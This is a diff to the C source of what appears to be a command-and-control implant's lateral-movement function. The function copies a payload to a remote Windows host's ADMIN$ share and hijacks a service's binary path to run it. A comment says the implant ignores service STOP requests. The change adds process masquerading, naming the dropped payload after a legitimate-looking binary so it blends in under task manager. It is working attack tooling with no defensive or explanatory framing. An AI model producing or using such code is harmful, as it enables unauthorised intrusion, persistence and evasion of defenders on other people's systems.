@@ -1168,11 +1168,26 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
         return FALSE;
     }
 
-    /* 1. Upload payload to \\target\ADMIN$ */
-    char rname[9];
-    _jump_randname(rname, 8);
+    /* 1. Upload payload to \\target\ADMIN$
+     * If spawnto_x64 has been customized (not default rundll32.exe),
+     * use its basename as the filename so the process looks legitimate
+     * in task manager.  Otherwise fall back to a random name. */
+    char fname[MAX_PATH];
+    {
+        char *slash = strrchr(_spawnto_x64, '\\');
+        char *base = slash ? slash + 1 : _spawnto_x64;
+        if (base[0] != '\0' && base[0] != '%'
+            && _stricmp(base, "rundll32.exe") != 0) {
+            strncpy(fname, base, MAX_PATH - 1);
+            fname[MAX_PATH - 1] = '\0';
+        } else {
+            char rnd[9];
+            _jump_randname(rnd, 8);
+            snprintf(fname, sizeof(fname), "%s.exe", rnd);
+        }
+    }
     wchar_t remotePath[512];
-    swprintf(remotePath, 512, L"\\\\%ls\\ADMIN$\\%hs.exe", target, rname);
+    swprintf(remotePath, 512, L"\\\\%ls\\ADMIN$\\%hs", target, fname);
 
     HANDLE hFile = CreateFileW(remotePath, GENERIC_WRITE, 0,
                                 NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -1237,7 +1252,7 @@ static BOOL _jump_scshell(Buffer *out, const wchar_t *target,
      * The agent's _svc_ctrl_handler ignores STOP so SCM can't
      * kill us cooperatively — we stay alive indefinitely. */
     wchar_t newBinPath[512];
-    swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs.exe", rname);
+    swprintf(newBinPath, 512, L"%%SystemRoot%%\\%hs", fname);
     pChangeCfg(hSvc, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
                SERVICE_ERROR_IGNORE, newBinPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
